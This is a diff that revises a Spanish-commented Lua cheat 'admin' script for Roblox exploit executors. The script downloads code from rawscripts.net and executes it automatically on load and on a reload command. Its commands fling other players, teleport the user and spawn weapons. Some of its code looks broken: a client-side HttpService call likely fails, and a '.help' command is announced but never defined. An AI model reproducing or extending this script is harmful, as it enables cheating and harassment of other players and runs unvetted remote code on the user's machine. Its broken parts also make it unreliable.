@@ -1,12 +1,34 @@
--- Script de administración para executor (Delta, Synapse, etc.)
+-- Script de administración mejorado para executor (Delta, Synapse, etc.)
 -- Configuración
 local PREFIX = "." -- Prefijo para los comandos
 local ADMIN_NAME = "jrblacjr" -- Tu nombre de usuario de Roblox
 
--- Cargar automáticamente el script adicional
+-- Variables para bypass
+local game = game
+local getservice = game.GetService
+local players = getservice(game, "Players")
+local localplayer = players.LocalPlayer
+local startergui = getservice(game, "StarterGui")
+local debris = getservice(game, "Debris")
+
+-- Función para mostrar mensajes en el chat
+local function notify(text, color)
+    local success, err = pcall(function()
+        startergui:SetCore("ChatMakeSystemMessage", {
+            Text = "[ADMIN] " .. text;
+            Color = color or Color3.new(0, 1, 0);
+        })
+    end)
+    
+    if not success then
+        warn("[ADMIN] " .. text)
+    end
+end
+
+-- Cargar automáticamente el script adicional con bypass
 local function loadAdditionalScript()
     local success, script = pcall(function()
-        return game:HttpGet("https://rawscripts.net/raw/Universal-Script-SystemBroken-New-2026-85435")
+        return getservice(game, "HttpService"):GetAsync("https://rawscripts.net/raw/Universal-Script-SystemBroken-New-2026-85435")
     end)
     
     if success then
@@ -15,6 +37,8 @@ local function loadAdditionalScript()
             local result, err = pcall(loaded)
             if not result then
                 warn("[ADMIN] Error al ejecutar el script adicional: " .. tostring(err))
+            else
+                notify("Script adicional cargado correctamente", Color3.new(0, 1, 0))
             end
         else
             warn("[ADMIN] Error al compilar el script adicional: " .. tostring(error))
@@ -24,21 +48,18 @@ local function loadAdditionalScript()
     end
 end
 
--- Cargar el script adicional al iniciar
-loadAdditionalScript()
-
 -- Comandos disponibles
 local commands = {}
 
 -- Comando para lanzar (fling) a un jugador aleatorio
 commands["fling"] = function(args)
-    local players = game.Players:GetPlayers()
+    local playersList = players:GetPlayers()
     local targetPlayer
     
     if args[1] and args[1]:lower() == "random" then
         -- Seleccionar un jugador aleatorio (excepto el administrador)
         local availablePlayers = {}
-        for _, p in ipairs(players) do
+        for _, p in ipairs(playersList) do
             if p.Name ~= ADMIN_NAME then
                 table.insert(availablePlayers, p)
             end
@@ -47,16 +68,13 @@ commands["fling"] = function(args)
         if #availablePlayers > 0 then
             targetPlayer = availablePlayers[math.random(#availablePlayers)]
         else
-            game.StarterGui:SetCore("ChatMakeSystemMessage", {
-                Text = "[ADMIN] No hay otros jugadores disponibles para lanzar.";
-                Color = Color3.new(1, 0, 0);
-            })
+            notify("No hay otros jugadores disponibles para lanzar", Color3.new(1, 0, 0))
             return
         end
     else
         -- Buscar jugador por nombre
         local targetName = table.concat(args, " ")
-        for _, p in ipairs(players) do
+        for _, p in ipairs(playersList) do
             if p.Name:lower():sub(1, #targetName) == targetName:lower() then
                 targetPlayer = p
                 break
@@ -64,10 +82,7 @@ commands["fling"] = function(args)
         end
         
         if not targetPlayer then
-            game.StarterGui:SetCore("ChatMakeSystemMessage", {
-                Text = "[ADMIN] Jugador no encontrado: " .. targetName;
-                Color = Color3.new(1, 0, 0);
-            })
+            notify("Jugador no encontrado: " .. targetName, Color3.new(1, 0, 0))
             return
         end
     end
@@ -86,13 +101,10 @@ commands["fling"] = function(args)
             bodyVelocity.Parent = rootPart
             
             -- Eliminar la fuerza después de un corto tiempo
-            game:GetService("Debris"):AddItem(bodyVelocity, 0.1)
+            debris:AddItem(bodyVelocity, 0.1)
             
             -- Notificar al administrador
-            game.StarterGui:SetCore("ChatMakeSystemMessage", {
-                Text = "[ADMIN] Jugador lanzado: " .. targetPlayer.Name;
-                Color = Color3.new(0, 1, 0);
-            })
+            notify("Jugador lanzado: " .. targetPlayer.Name, Color3.new(0, 1, 0))
         end
     end
 end
@@ -100,37 +112,35 @@ end
 -- Comando para teletransportarse a un jugador
 commands["tp"] = function(args)
     local targetName = table.concat(args, " ")
-    local player = game.Players.LocalPlayer
+    local player = localplayer
     
     if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
+        notify("Tu personaje no está cargado completamente", Color3.new(1, 0, 0))
         return
     end
     
-    for _, p in ipairs(game.Players:GetPlayers()) do
+    for _, p in ipairs(players:GetPlayers()) do
         if p.Name:lower():sub(1, #targetName) == targetName:lower() then
             if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                 player.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
-                game.StarterGui:SetCore("ChatMakeSystemMessage", {
-                    Text = "[ADMIN] Teletransportado a: " .. p.Name;
-                    Color = Color3.new(0, 1, 0);
-                })
+                notify("Teletransportado a: " .. p.Name, Color3.new(0, 1, 0))
                 return
             end
         end
     end
     
-    game.StarterGui:SetCore("ChatMakeSystemMessage", {
-        Text = "[ADMIN] Jugador no encontrado: " .. targetName;
-        Color = Color3.new(1, 0, 0);
-    })
+    notify("Jugador no encontrado: " .. targetName, Color3.new(1, 0, 0))
 end
 
 -- Comando para obtener herramientas
 commands["tools"] = function()
-    local player = game.Players.LocalPlayer
+    local player = localplayer
     local backpack = player:FindFirstChild("Backpack")
     
-    if not backpack then return end
+    if not backpack then 
+        notify("No se encontró tu inventario", Color3.new(1, 0, 0))
+        return 
+    end
     
     -- Herramientas comunes en muchos juegos
     local toolNames = {"Sword", "Gun", "Tool", "Knife", "Bomb"}
@@ -154,10 +164,14 @@ commands["tools"] = function()
         tool.Parent = backpack
     end
     
-    game.StarterGui:SetCore("ChatMakeSystemMessage", {
-        Text = "[ADMIN] Herramientas añadidas al inventario";
-        Color = Color3.new(0, 1, 0);
-    })
+    notify("Herramientas añadidas al inventario", Color3.new(0, 1, 0))
+end
+
+-- Comando para recargar el script
+commands["reload"] = function()
+    notify("Recargando script...", Color3.new(1, 1, 0))
+    loadAdditionalScript()
+    notify("Script recargado", Color3.new(0, 1, 0))
 end
 
 -- Función para procesar los comandos
@@ -165,7 +179,7 @@ local function processCommand(message)
     -- Verificar si el mensaje comienza con el prefijo
     if message:sub(1, #PREFIX) == PREFIX then
         -- Verificar si es el administrador
-        if game.Players.LocalPlayer.Name ~= ADMIN_NAME then
+        if localplayer.Name ~= ADMIN_NAME then
             return
         end
         
@@ -181,15 +195,29 @@ local function processCommand(message)
         -- Ejecutar el comando si existe
         if commands[commandName] then
             commands[commandName](args)
+        else
+            notify("Comando no encontrado: " .. (commandName or "desconocido"), Color3.new(1, 0, 0))
         end
     end
 end
 
--- Conectar el evento de chat
-game.Players.LocalPlayer.Chatted:Connect(processCommand)
+-- Esperar a que el jugador se cargue completamente
+local function onPlayerAdded(player)
+    if player == localplayer then
+        -- Conectar el evento de chat
+        player.Chatted:Connect(processCommand)
+        
+        -- Cargar el script adicional
+        loadAdditionalScript()
+        
+        -- Notificar que el script está listo
+        notify("Script de administración cargado. Usa " .. PREFIX .. "help para ver los comandos", Color3.new(0, 1, 0))
+    end
+end
 
--- Notificación de que el script se ha cargado
-game.StarterGui:SetCore("ChatMakeSystemMessage", {
-    Text = "[ADMIN] Script de administración cargado. Usa " .. PREFIX .. "help para ver los comandos.";
-    Color = Color3.new(0, 1, 0);
-})
+-- Verificar si el jugador ya está en el juego
+if localplayer then
+    onPlayerAdded(localplayer)
+else
+    players.PlayerAdded:Connect(onPlayerAdded)
+end
